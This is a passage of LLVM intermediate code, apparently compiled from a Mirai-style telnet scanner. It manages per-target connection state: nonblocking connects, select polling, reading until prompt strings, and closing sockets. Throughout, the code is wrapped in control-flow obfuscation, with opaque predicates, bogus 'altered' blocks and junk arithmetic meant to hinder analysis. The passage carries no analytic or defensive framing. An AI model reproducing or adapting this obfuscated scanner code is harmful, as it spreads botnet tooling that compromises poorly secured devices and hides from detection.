  %3113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3112
  %3114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3113, i32 0, i32 7
  store i16 %3110, i16* %3114, align 16
  br label %3115

; <label>:3115:                                   ; preds = %3103
  %3116 = load i32, i32* @x.69
  %3117 = load i32, i32* @y.70
  %3118 = sub i32 %3116, 1
  %3119 = mul i32 %3116, %3118
  %3120 = urem i32 %3119, 2
  %3121 = icmp eq i32 %3120, 0
  %3122 = icmp slt i32 %3117, 10
  %3123 = or i1 %3121, %3122
  br i1 %3123, label %originalBB298, label %originalBB298alteredBB

originalBB298:                                    ; preds = %originalBB298alteredBB, %3115
  %3124 = load i32, i32* @x.69
  %3125 = load i32, i32* @y.70
  %3126 = sub i32 %3124, 1
  %3127 = mul i32 %3124, %3126
  %3128 = urem i32 %3127, 2
  %3129 = icmp eq i32 %3128, 0
  %3130 = icmp slt i32 %3125, 10
  %3131 = or i1 %3129, %3130
  br i1 %3131, label %originalBBpart2300, label %originalBB298alteredBB

originalBBpart2300:                               ; preds = %originalBB298
  br label %3132

; <label>:3132:                                   ; preds = %originalBBpart2300
  %3133 = load i32, i32* @x.69
  %3134 = load i32, i32* @y.70
  %3135 = sub i32 %3133, 1
  %3136 = mul i32 %3133, %3135
  %3137 = urem i32 %3136, 2
  %3138 = icmp eq i32 %3137, 0
  %3139 = icmp slt i32 %3134, 10
  %3140 = or i1 %3138, %3139
  br i1 %3140, label %originalBB302, label %originalBB302alteredBB

originalBB302:                                    ; preds = %originalBB302alteredBB, %3132
  %3141 = load i32, i32* @x.69
  %3142 = load i32, i32* @y.70
  %3143 = sub i32 %3141, 1
  %3144 = mul i32 %3141, %3143
  %3145 = urem i32 %3144, 2
  %3146 = icmp eq i32 %3145, 0
  %3147 = icmp slt i32 %3142, 10
  %3148 = or i1 %3146, %3147
  br i1 %3148, label %originalBBpart2304, label %originalBB302alteredBB

originalBBpart2304:                               ; preds = %originalBB302
  br label %3149

; <label>:3149:                                   ; preds = %originalBBpart2304
  %3150 = load i32, i32* @x.69
  %3151 = load i32, i32* @y.70
  %3152 = sub i32 %3150, 1
  %3153 = mul i32 %3150, %3152
  %3154 = urem i32 %3153, 2
  %3155 = icmp eq i32 %3154, 0
  %3156 = icmp slt i32 %3151, 10
  %3157 = or i1 %3155, %3156
  br i1 %3157, label %originalBB306, label %originalBB306alteredBB

originalBB306:                                    ; preds = %originalBB306alteredBB, %3149
  %3158 = load i32, i32* %2, align 4
  %3159 = sext i32 %3158 to i64
  %3160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3159
  %3161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3160, i32 0, i32 6
  %3162 = load i32, i32* %3161, align 4
  %3163 = add i32 %3162, 10
  %3164 = zext i32 %3163 to i64
  %3165 = call i64 @time(i64* null) #2
  %3166 = icmp slt i64 %3164, %3165
  %3167 = load i32, i32* @x.69
  %3168 = load i32, i32* @y.70
  %3169 = sub i32 %3167, 1
  %3170 = mul i32 %3167, %3169
  %3171 = urem i32 %3170, 2
  %3172 = icmp eq i32 %3171, 0
  %3173 = icmp slt i32 %3168, 10
  %3174 = or i1 %3172, %3173
  br i1 %3174, label %originalBBpart2317, label %originalBB306alteredBB

originalBBpart2317:                               ; preds = %originalBB306
  br i1 %3166, label %3175, label %3206

; <label>:3175:                                   ; preds = %originalBBpart2317
  %3176 = load i32, i32* @x.69
  %3177 = load i32, i32* @y.70
  %3178 = sub i32 %3176, 1
  %3179 = mul i32 %3176, %3178
  %3180 = urem i32 %3179, 2
  %3181 = icmp eq i32 %3180, 0
  %3182 = icmp slt i32 %3177, 10
  %3183 = or i1 %3181, %3182
  br i1 %3183, label %originalBB319, label %originalBB319alteredBB

originalBB319:                                    ; preds = %originalBB319alteredBB, %3175
  %3184 = load i32, i32* %2, align 4
  %3185 = sext i32 %3184 to i64
  %3186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3185
  %3187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3186, i32 0, i32 0
  %3188 = load i32, i32* %3187, align 16
  %3189 = call i32 @sclose(i32 %3188)
  %3190 = load i32, i32* %2, align 4
  %3191 = sext i32 %3190 to i64
  %3192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3191
  %3193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3192, i32 0, i32 2
  store i8 0, i8* %3193, align 8
  %3194 = load i32, i32* %2, align 4
  %3195 = sext i32 %3194 to i64
  %3196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3195
  %3197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3196, i32 0, i32 3
  store i8 1, i8* %3197, align 1
  %3198 = load i32, i32* @x.69
  %3199 = load i32, i32* @y.70
  %3200 = sub i32 %3198, 1
  %3201 = mul i32 %3198, %3200
  %3202 = urem i32 %3201, 2
  %3203 = icmp eq i32 %3202, 0
  %3204 = icmp slt i32 %3199, 10
  %3205 = or i1 %3203, %3204
  br i1 %3205, label %originalBBpart2321, label %originalBB319alteredBB

originalBBpart2321:                               ; preds = %originalBB319
  br label %3206

; <label>:3206:                                   ; preds = %originalBBpart2321, %originalBBpart2317
  %3207 = load i32, i32* @x.69
  %3208 = load i32, i32* @y.70
  %3209 = sub i32 %3207, 1
  %3210 = mul i32 %3207, %3209
  %3211 = urem i32 %3210, 2
  %3212 = icmp eq i32 %3211, 0
  %3213 = icmp slt i32 %3208, 10
  %3214 = or i1 %3212, %3213
  br i1 %3214, label %originalBB323, label %originalBB323alteredBB

originalBB323:                                    ; preds = %originalBB323alteredBB, %3206
  %3215 = load i32, i32* @x.69
  %3216 = load i32, i32* @y.70
  %3217 = sub i32 %3215, 1
  %3218 = mul i32 %3215, %3217
  %3219 = urem i32 %3218, 2
  %3220 = icmp eq i32 %3219, 0
  %3221 = icmp slt i32 %3216, 10
  %3222 = or i1 %3220, %3221
  br i1 %3222, label %originalBBpart2325, label %originalBB323alteredBB

originalBBpart2325:                               ; preds = %originalBB323
  br label %3223

; <label>:3223:                                   ; preds = %originalBBpart2325, %2843, %originalBBpart2288, %2739, %originalBBpart2280, %1705, %1625, %1164, %1068, %549, %295, %84
  br label %3224

; <label>:3224:                                   ; preds = %3223, %3043, %2983, %2923, %2828, %2768, %2724, %2624, %2599, %2542, %2501, %originalBBpart2257, %originalBBpart2253, %2330, %2305, %originalBBpart2241, %originalBBpart2237, %2166, %originalBBpart2233, %2068, %2043, %1970, %1929, %1901, %1860, %1819, %1791, %1690, %1667, %1573, %1550, %1527, %1504, %1481, %originalBBpart2193, %originalBBpart2189, %1364, %1341, %1311, %1244, %originalBBpart2173, %originalBBpart2169, %974, %907, %808, %originalBBpart2123, %658, %originalBBpart279, %232, %originalBBpart28
  %3225 = load i32, i32* %2, align 4
  %3226 = add nsw i32 %3225, 1
  store i32 %3226, i32* %2, align 4
  br label %64

; <label>:3227:                                   ; preds = %originalBBpart2
  br label %62
                                                  ; No predecessors!
  %3229 = load i32, i32* @x.69
  %3230 = load i32, i32* @y.70
  %3231 = sub i32 %3229, 1
  %3232 = mul i32 %3229, %3231
  %3233 = urem i32 %3232, 2
  %3234 = icmp eq i32 %3233, 0
  %3235 = icmp slt i32 %3230, 10
  %3236 = or i1 %3234, %3235
  br i1 %3236, label %originalBB327, label %originalBB327alteredBB

originalBB327:                                    ; preds = %originalBB327alteredBB, %3228
  %3237 = load i32, i32* @x.69
  %3238 = load i32, i32* @y.70
  %3239 = sub i32 %3237, 1
  %3240 = mul i32 %3237, %3239
  %3241 = urem i32 %3240, 2
  %3242 = icmp eq i32 %3241, 0
  %3243 = icmp slt i32 %3238, 10
  %3244 = or i1 %3242, %3243
  br i1 %3244, label %originalBBpart2329, label %originalBB327alteredBB

originalBBpart2329:                               ; preds = %originalBB327
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %64
  %3245 = load i32, i32* %2, align 4
  %3246 = load i32, i32* %1, align 4
  %3247 = icmp slt i32 %3245, %3246
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %148
  %3248 = load i32, i32* %2, align 4
  %3249 = sext i32 %3248 to i64
  %3250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3249
  %3251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3250, i32 0, i32 4
  %3252 = load i8, i8* %3251, align 2
  %3253 = zext i8 %3252 to i64
  %3254 = icmp eq i64 %3253, 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %172
  %3255 = load i32, i32* %2, align 4
  %3256 = sext i32 %3255 to i64
  %3257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3256
  %3258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3257, i32 0, i32 3
  store i8 1, i8* %3258, align 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %233
  %3259 = load i32, i32* %2, align 4
  %3260 = sext i32 %3259 to i64
  %3261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3260
  %3262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3261, i32 0, i32 0
  %3263 = load i32, i32* %3262, align 16
  %3264 = load i32, i32* %2, align 4
  %3265 = sext i32 %3264 to i64
  %3266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3265
  %3267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3266, i32 0, i32 0
  %3268 = load i32, i32* %3267, align 16
  %3269 = call i32 (i32, i32, ...) @fcntl(i32 %3268, i32 3, i8* null)
  %_ = sub i32 %3269, 2048
  %gen = mul i32 %_, 2048
  %_11 = sub i32 %3269, 2048
  %gen12 = mul i32 %_11, 2048
  %3270 = or i32 %3269, 2048
  %3271 = call i32 (i32, i32, ...) @fcntl(i32 %3263, i32 4, i32 %3270)
  %3272 = load i32, i32* %2, align 4
  %3273 = sext i32 %3272 to i64
  %3274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3273
  %3275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3274, i32 0, i32 0
  %3276 = load i32, i32* %3275, align 16
  %3277 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %3278 = call i32 @connect(i32 %3276, %struct.sockaddr* %3277, i32 16)
  %3279 = icmp eq i32 %3278, -1
  br label %originalBB10

originalBB16alteredBB:                            ; preds = %originalBB16, %311
  %3280 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %3281 = getelementptr inbounds [16 x i64], [16 x i64]* %3280, i64 0, i64 0
  %3282 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %3281) #2, !srcloc !6
  %3283 = extractvalue { i64, i64* } %3282, 0
  %3284 = extractvalue { i64, i64* } %3282, 1
  %3285 = trunc i64 %3283 to i32
  store i32 %3285, i32* %12, align 4
  %3286 = ptrtoint i64* %3284 to i64
  %3287 = trunc i64 %3286 to i32
  store i32 %3287, i32* %13, align 4
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %337
  %3288 = load i32, i32* %2, align 4
  %3289 = sext i32 %3288 to i64
  %3290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3289
  %3291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3290, i32 0, i32 0
  %3292 = load i32, i32* %3291, align 16
  %_21 = sub i32 %3292, 64
  %gen22 = mul i32 %_21, 64
  %_23 = sub i32 0, %3292
  %gen24 = add i32 %_23, 64
  %_25 = sub i32 0, %3292
  %gen26 = add i32 %_25, 64
  %_27 = shl i32 %3292, 64
  %_28 = shl i32 %3292, 64
  %_29 = sub i32 0, %3292
  %gen30 = add i32 %_29, 64
  %_31 = shl i32 %3292, 64
  %_32 = sub i32 0, %3292
  %gen33 = add i32 %_32, 64
  %3293 = srem i32 %3292, 64
  %3294 = zext i32 %3293 to i64
  %_34 = sub i64 1, %3294
  %gen35 = mul i64 %_34, %3294
  %_36 = shl i64 1, %3294
  %_37 = shl i64 1, %3294
  %_38 = sub i64 1, %3294
  %gen39 = mul i64 %_38, %3294
  %_40 = sub i64 0, 1
  %gen41 = add i64 %_40, %3294
  %_42 = sub i64 0, 1
  %gen43 = add i64 %_42, %3294
  %_44 = sub i64 1, %3294
  %gen45 = mul i64 %_44, %3294
  %_46 = sub i64 0, 1
  %gen47 = add i64 %_46, %3294
  %_48 = sub i64 1, %3294
  %gen49 = mul i64 %_48, %3294
  %3295 = shl i64 1, %3294
  %3296 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %3297 = load i32, i32* %2, align 4
  %3298 = sext i32 %3297 to i64
  %3299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3298
  %3300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3299, i32 0, i32 0
  %3301 = load i32, i32* %3300, align 16
  %_50 = sub i32 0, %3301
  %gen51 = add i32 %_50, 64
  %_52 = shl i32 %3301, 64
  %3302 = sdiv i32 %3301, 64
  %3303 = sext i32 %3302 to i64
  %3304 = getelementptr inbounds [16 x i64], [16 x i64]* %3296, i64 0, i64 %3303
  %3305 = load i64, i64* %3304, align 8
  %_53 = shl i64 %3305, %3295
  %3306 = or i64 %3305, %3295
  store i64 %3306, i64* %3304, align 8
  %3307 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %3307, align 8
  %3308 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %3308, align 8
  %3309 = load i32, i32* %2, align 4
  %3310 = sext i32 %3309 to i64
  %3311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3310
  %3312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3311, i32 0, i32 0
  %3313 = load i32, i32* %3312, align 16
  %_54 = sub i32 0, %3313
  %gen55 = add i32 %_54, 1
  %_56 = sub i32 %3313, 1
  %gen57 = mul i32 %_56, 1
  %_58 = shl i32 %3313, 1
  %3314 = add nsw i32 %3313, 1
  %3315 = call i32 @select(i32 %3314, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %3315, i32* %3, align 4
  %3316 = load i32, i32* %3, align 4
  %3317 = icmp eq i32 %3316, 1
  br label %originalBB20

originalBB62alteredBB:                            ; preds = %originalBB62, %384
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %3318 = load i32, i32* %2, align 4
  %3319 = sext i32 %3318 to i64
  %3320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3319
  %3321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3320, i32 0, i32 0
  %3322 = load i32, i32* %3321, align 16
  %3323 = bitcast i32* %7 to i8*
  %3324 = call i32 @getsockopt(i32 %3322, i32 1, i32 4, i8* %3323, i32* %6) #2
  %3325 = load i32, i32* %7, align 4
  %3326 = icmp ne i32 %3325, 0
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %425
  %3327 = load i32, i32* %2, align 4
  %3328 = sext i32 %3327 to i64
  %3329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3328
  %3330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3329, i32 0, i32 0
  %3331 = load i32, i32* %3330, align 16
  %3332 = load i32, i32* %2, align 4
  %3333 = sext i32 %3332 to i64
  %3334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3333
  %3335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3334, i32 0, i32 0
  %3336 = load i32, i32* %3335, align 16
  %3337 = call i32 (i32, i32, ...) @fcntl(i32 %3336, i32 3, i8* null)
  %_67 = shl i32 %3337, -2049
  %_68 = sub i32 0, %3337
  %gen69 = add i32 %_68, -2049
  %_70 = sub i32 0, %3337
  %gen71 = add i32 %_70, -2049
  %_72 = sub i32 %3337, -2049
  %gen73 = mul i32 %_72, -2049
  %_74 = sub i32 %3337, -2049
  %gen75 = mul i32 %_74, -2049
  %_76 = sub i32 0, %3337
  %gen77 = add i32 %_76, -2049
  %3338 = and i32 %3337, -2049
  %3339 = call i32 (i32, i32, ...) @fcntl(i32 %3331, i32 4, i32 %3338)
  %3340 = load i32, i32* %2, align 4
  %3341 = sext i32 %3340 to i64
  %3342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3341
  %3343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3342, i32 0, i32 6
  store i32 0, i32* %3343, align 4
  %3344 = load i32, i32* %2, align 4
  %3345 = sext i32 %3344 to i64
  %3346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3345
  %3347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3346, i32 0, i32 7
  store i16 0, i16* %3347, align 16
  %3348 = load i32, i32* %2, align 4
  %3349 = sext i32 %3348 to i64
  %3350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3349
  %3351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3350, i32 0, i32 8
  %3352 = load i8*, i8** %3351, align 8
  call void @llvm.memset.p0i8.i64(i8* %3352, i8 0, i64 1024, i32 1, i1 false)
  %3353 = load i32, i32* %2, align 4
  %3354 = sext i32 %3353 to i64
  %3355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3354
  %3356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3355, i32 0, i32 2
  store i8 2, i8* %3356, align 8
  br label %originalBB66

originalBB81alteredBB:                            ; preds = %originalBB81, %476
  %3357 = load i32, i32* %2, align 4
  %3358 = sext i32 %3357 to i64
  %3359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3358
  %3360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3359, i32 0, i32 0
  %3361 = load i32, i32* %3360, align 16
  %3362 = call i32 @sclose(i32 %3361)
  %3363 = load i32, i32* %2, align 4
  %3364 = sext i32 %3363 to i64
  %3365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3364
  %3366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3365, i32 0, i32 2
  store i8 0, i8* %3366, align 8
  %3367 = load i32, i32* %2, align 4
  %3368 = sext i32 %3367 to i64
  %3369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3368
  %3370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3369, i32 0, i32 3
  store i8 1, i8* %3370, align 1
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %508
  %3371 = load i32, i32* %2, align 4
  %3372 = sext i32 %3371 to i64
  %3373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3372
  %3374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3373, i32 0, i32 6
  %3375 = load i32, i32* %3374, align 4
  %_86 = shl i32 %3375, 10
  %_87 = sub i32 %3375, 10
  %gen88 = mul i32 %_87, 10
  %_89 = sub i32 %3375, 10
  %gen90 = mul i32 %_89, 10
  %_91 = shl i32 %3375, 10
  %_92 = sub i32 %3375, 10
  %gen93 = mul i32 %_92, 10
  %_94 = sub i32 %3375, 10
  %gen95 = mul i32 %_94, 10
  %_96 = sub i32 0, %3375
  %gen97 = add i32 %_96, 10
  %_98 = sub i32 %3375, 10
  %gen99 = mul i32 %_98, 10
  %_100 = sub i32 0, %3375
  %gen101 = add i32 %_100, 10
  %3376 = add i32 %3375, 10
  %3377 = zext i32 %3376 to i64
  %3378 = call i64 @time(i64* null) #2
  %3379 = icmp slt i64 %3377, %3378
  br label %originalBB85

originalBB105alteredBB:                           ; preds = %originalBB105, %557
  %3380 = call i64 @time(i64* null) #2
  %3381 = trunc i64 %3380 to i32
  %3382 = load i32, i32* %2, align 4
  %3383 = sext i32 %3382 to i64
  %3384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3383
  %3385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3384, i32 0, i32 6
  store i32 %3381, i32* %3385, align 4
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %599
  %3386 = load i32, i32* %2, align 4
  %3387 = sext i32 %3386 to i64
  %3388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3387
  %3389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3388, i32 0, i32 6
  store i32 0, i32* %3389, align 4
  %3390 = load i32, i32* %2, align 4
  %3391 = sext i32 %3390 to i64
  %3392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3391
  %3393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3392, i32 0, i32 7
  store i16 0, i16* %3393, align 16
  %3394 = load i32, i32* %2, align 4
  %3395 = sext i32 %3394 to i64
  %3396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3395
  %3397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3396, i32 0, i32 8
  %3398 = load i8*, i8** %3397, align 8
  %3399 = call i8* @strstr(i8* %3398, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %3400 = icmp ne i8* %3399, null
  br label %originalBB109

originalBB113alteredBB:                           ; preds = %originalBB113, %636
  %3401 = load i32, i32* %2, align 4
  %3402 = sext i32 %3401 to i64
  %3403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3402
  %3404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3403, i32 0, i32 8
  %3405 = load i8*, i8** %3404, align 8
  call void @llvm.memset.p0i8.i64(i8* %3405, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB113

originalBB117alteredBB:                           ; preds = %originalBB117, %698
  %3406 = load i32, i32* %2, align 4
  %3407 = sext i32 %3406 to i64
  %3408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3407
  %3409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3408, i32 0, i32 2
  store i8 5, i8* %3409, align 8
  br label %originalBB117

originalBB121alteredBB:                           ; preds = %originalBB121, %725
  %3410 = load i32, i32* %2, align 4
  %3411 = sext i32 %3410 to i64
  %3412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3411
  %3413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3412, i32 0, i32 2
  store i8 3, i8* %3413, align 8
  br label %originalBB121

originalBB125alteredBB:                           ; preds = %originalBB125, %765
  %3414 = load i32, i32* %2, align 4
  %3415 = sext i32 %3414 to i64
  %3416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3415
  %3417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3416, i32 0, i32 6
  store i32 0, i32* %3417, align 4
  %3418 = load i32, i32* %2, align 4
  %3419 = sext i32 %3418 to i64
  %3420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3419
  %3421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3420, i32 0, i32 7
  store i16 0, i16* %3421, align 16
  %3422 = load i32, i32* %2, align 4
  %3423 = sext i32 %3422 to i64
  %3424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3423
  %3425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3424, i32 0, i32 8
  %3426 = load i8*, i8** %3425, align 8
  %3427 = call i8* @strstr(i8* %3426, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %3428 = icmp ne i8* %3427, null
  br label %originalBB125

originalBB129alteredBB:                           ; preds = %originalBB129, %813
  %3429 = load i32, i32* %2, align 4
  %3430 = sext i32 %3429 to i64
  %3431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3430
  %3432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3431, i32 0, i32 0
  %3433 = load i32, i32* %3432, align 16
  %3434 = load i32, i32* %2, align 4
  %3435 = sext i32 %3434 to i64
  %3436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3435
  %3437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3436, i32 0, i32 8
  %3438 = load i8*, i8** %3437, align 8
  %3439 = load i32, i32* %2, align 4
  %3440 = sext i32 %3439 to i64
  %3441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3440
  %3442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3441, i32 0, i32 7
  %3443 = load i16, i16* %3442, align 16
  %3444 = zext i16 %3443 to i32
  %3445 = call i32 @readUntil(i32 %3433, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %3438, i32 1024, i32 %3444)
  %3446 = icmp ne i32 %3445, 0
  br label %originalBB129

originalBB133alteredBB:                           ; preds = %originalBB133, %848
  %3447 = load i32, i32* %2, align 4
  %3448 = sext i32 %3447 to i64
  %3449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3448
  %3450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3449, i32 0, i32 6
  store i32 0, i32* %3450, align 4
  %3451 = load i32, i32* %2, align 4
  %3452 = sext i32 %3451 to i64
  %3453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3452
  %3454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3453, i32 0, i32 7
  store i16 0, i16* %3454, align 16
  %3455 = load i32, i32* %2, align 4
  %3456 = sext i32 %3455 to i64
  %3457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3456
  %3458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3457, i32 0, i32 8
  %3459 = load i8*, i8** %3458, align 8
  %3460 = call i8* @strstr(i8* %3459, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %3461 = icmp ne i8* %3460, null
  br label %originalBB133

originalBB137alteredBB:                           ; preds = %originalBB137, %885
  %3462 = load i32, i32* %2, align 4
  %3463 = sext i32 %3462 to i64
  %3464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3463
  %3465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3464, i32 0, i32 8
  %3466 = load i8*, i8** %3465, align 8
  call void @llvm.memset.p0i8.i64(i8* %3466, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB137

originalBB141alteredBB:                           ; preds = %originalBB141, %912
  %3467 = load i32, i32* %2, align 4
  %3468 = sext i32 %3467 to i64
  %3469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3468
  %3470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3469, i32 0, i32 0
  %3471 = load i32, i32* %3470, align 16
  %3472 = load i32, i32* %2, align 4
  %3473 = sext i32 %3472 to i64
  %3474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3473
  %3475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3474, i32 0, i32 8
  %3476 = load i8*, i8** %3475, align 8
  %3477 = load i32, i32* %2, align 4
  %3478 = sext i32 %3477 to i64
  %3479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3478
  %3480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3479, i32 0, i32 7
  %3481 = load i16, i16* %3480, align 16
  %3482 = zext i16 %3481 to i32
  %3483 = call i32 @readUntil(i32 %3471, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %3476, i32 1024, i32 %3482)
  %3484 = icmp ne i32 %3483, 0
  br label %originalBB141

originalBB145alteredBB:                           ; preds = %originalBB145, %979
  %3485 = load i32, i32* %2, align 4
  %3486 = sext i32 %3485 to i64
  %3487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3486
  %3488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3487, i32 0, i32 8
  %3489 = load i8*, i8** %3488, align 8
  %3490 = call i64 @strlen(i8* %3489) #10
  %3491 = trunc i64 %3490 to i16
  %3492 = load i32, i32* %2, align 4
  %3493 = sext i32 %3492 to i64
  %3494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3493
  %3495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3494, i32 0, i32 7
  store i16 %3491, i16* %3495, align 16
  br label %originalBB145

originalBB149alteredBB:                           ; preds = %originalBB149, %1008
  br label %originalBB149

originalBB153alteredBB:                           ; preds = %originalBB153, %1027
  %3496 = load i32, i32* %2, align 4
  %3497 = sext i32 %3496 to i64
  %3498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3497
  %3499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3498, i32 0, i32 6
  %3500 = load i32, i32* %3499, align 4
  %_154 = sub i32 %3500, 10
  %gen155 = mul i32 %_154, 10
  %_156 = sub i32 0, %3500
  %gen157 = add i32 %_156, 10
  %_158 = sub i32 %3500, 10
  %gen159 = mul i32 %_158, 10
